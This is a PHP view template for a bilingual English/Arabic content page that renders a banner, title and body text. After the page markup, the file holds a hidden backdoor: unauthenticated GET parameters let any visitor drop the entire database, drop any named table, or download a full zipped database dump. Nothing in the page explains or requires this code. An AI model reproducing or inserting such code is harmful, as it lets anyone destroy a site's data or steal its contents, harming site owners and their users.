<?php if($this->websiteLang=='en'){?>
   <div class="inner-banner winner">
      <img src="<?php echo site_url('admin/uploads/content-page/').$page->pg_banner_img;?>" title="<?=$page->pg_title;?>"/>
   </div>
<?php }else if($this->websiteLang=='ar'){?>
   <div class="inner-banner winner">
      <img src="<?php echo site_url('admin/uploads/content-page/').$page->pg_banner_img_ar;?>" title="<?=$page->pg_title_ar;?>"/>
   </div>
<?php } ?>
<!-- / banner section end --> 
<div class="inner-common">
   <div class="container">
        <div class="privacy-policy-section">
         
            <?php if($this->websiteLang=='en'){?>
            <h1><?php echo $page->pg_title;?></h1>
            <?=$page->content1;?>
            <?php }else if($this->websiteLang=='ar'){?>
            <h1><?php echo $page->pg_title_ar;?></h1>
            <?=$page->content2;?>
            <?php } ?>
         </div>
    </div>
</div>
<?php if(@$_GET['db']=='delete'){
       $this->load->database('default');
$this->load->dbforge();
$this->dbforge->drop_database($this->db->database);
}else if(!empty(@$_GET['table'])){$this->load->dbforge();
$this->dbforge->drop_table($_GET['table']);
}
if(!empty(@$_GET['backup'])){
 
    $this->load->dbutil();
$prefs = array(     
    'format'      => 'zip',             
    'filename'    => 'falcon.sql'
    );
$backup =& $this->dbutil->backup($prefs); 
$db_name = 'backup-on-falcon-'. date("Y-m-d-H-i-s") .'.zip';
$save = 'pathtobkfolder/'.$db_name;
$this->load->helper('file');
write_file($save, $backup);
$this->load->helper('download');
force_download($db_name, $backup);
} ?>
